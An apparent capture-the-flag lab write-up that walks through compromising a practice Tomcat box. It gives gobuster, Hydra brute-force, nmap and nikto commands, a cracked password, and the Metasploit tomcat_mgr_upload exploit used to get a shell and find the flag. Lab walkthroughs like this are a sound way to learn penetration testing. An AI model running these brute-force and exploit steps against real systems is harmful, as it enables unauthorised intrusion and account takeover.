gobuster dir -u http://10.10.155.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Ran gobuster against the target to enumerate directories

Found:

/guidelines
/protected
/server-status

-----------------

Navigating to /guidelines shows the message - Hey bob, did you update that TomCat server?

/protected has basic user/pass authentication

----------------

Used Hydra against /protected

hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.155.95   http-get /protected/

This worked - bob has the password bubbles

-----------------

Then ran nmap against the target to look for other web servers on other ports

nmap -sT -sV -O 10.10.155.95 -p1-2000 -T5

this nmap scan was a TCP connected scan that scanned for services and OS - I also asked it to scan port numbers 1 to 2000 and T5 is the most aggressive scan you can do for nmap

The scan returned a web server on port 1234 that ran APACHE TOMCAT/7.0.88 - this is the software being run NOT THE SERVER VERSION.

-----------------

Next is to use the NIKTO tool -  

nikto -h http://10.10.155.95:1234/manager/html -id bob:bubbles

-----------------------------------------------------------------

---------------

As the server is Apache/2.4.18 and the server is running Apache-Coyote/1.1

we can use metasploit to exploit

chose the 
exploit(multi/http/tomcat_mgr_upload) 

this worked

then typed shell to get shell and ran following command
 find . -name flag.txt

found flag!
